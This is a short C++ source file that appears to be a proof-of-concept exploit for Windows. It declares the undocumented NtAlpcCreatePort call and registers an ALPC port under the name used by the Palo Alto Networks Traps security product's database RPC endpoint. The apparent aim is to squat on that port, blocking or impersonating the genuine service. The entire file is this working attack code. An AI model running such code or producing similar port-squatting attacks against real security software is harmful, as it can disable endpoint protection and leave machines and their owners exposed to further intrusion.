#include <iostream>
#include <Windows.h>
#include "psapi.h"
#include <winternl.h>

#pragma comment( lib, "ntdll" )


typedef struct _ALPC_PORT_ATTRIBUTES
{
	unsigned long Flags;
	SECURITY_QUALITY_OF_SERVICE SecurityQos;
	unsigned __int64 MaxMessageLength;
	unsigned __int64 MemoryBandwidth;
	unsigned __int64 MaxPoolUsage;
	unsigned __int64 MaxSectionSize;
	unsigned __int64 MaxViewSize;
	unsigned __int64 MaxTotalSectionSize;
	ULONG DupObjectTypes;
#ifdef _WIN64
	ULONG Reserved;
#endif
} ALPC_PORT_ATTRIBUTES, * PALPC_PORT_ATTRIBUTES;


EXTERN_C
NTSTATUS NTAPI NtAlpcCreatePort(
	_Out_ PHANDLE PortHandle,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PALPC_PORT_ATTRIBUTES PortAttributes
);

int main() {
	NTSTATUS lSuccess;
	HANDLE hConnectionPort;
	UNICODE_STRING usAlpcPortName;
	OBJECT_ATTRIBUTES objAttributes;
	LPCWSTR pwsPortName = L"\\RPC Control\\Palo-Alto-Networks-Traps-DB-Rpc";	
	wprintf(L"[*] Starting Server\n");


	RtlInitUnicodeString(&usAlpcPortName, pwsPortName);
	InitializeObjectAttributes(
		&objAttributes,
		&usAlpcPortName,
		0,
		NULL,
		NULL				
	);
	wprintf(L"[*] Creatng ALPC Port '%s'...", pwsPortName);
	lSuccess = NtAlpcCreatePort(
		&hConnectionPort,
		&objAttributes,
		0 		
	);
	if (!NT_SUCCESS(lSuccess)) {
		wprintf(L"Error1: 0x%X\n", lSuccess);

	}
	else wprintf(L"Success.\n");
	std::getchar();

	return 0;
}